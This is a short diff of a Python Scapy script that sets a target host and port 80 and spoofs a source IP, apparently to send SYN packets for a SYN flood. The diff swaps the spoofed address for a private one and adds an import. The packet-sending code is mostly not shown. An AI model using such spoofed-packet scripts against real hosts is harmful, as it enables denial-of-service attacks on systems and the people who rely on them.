@@ -19,10 +19,11 @@
 # # send(packet, count=10)  # Send 10 packets
 
 from scapy.all import *
+import time
 
 # Define the target and spoofed IP
 target_ip = "www.example.com"
-spoofed_ip = "1.32.232.0"
+spoofed_ip = "192.168.1.100"
 target_port = 80
 
 # Create and send SYN packets
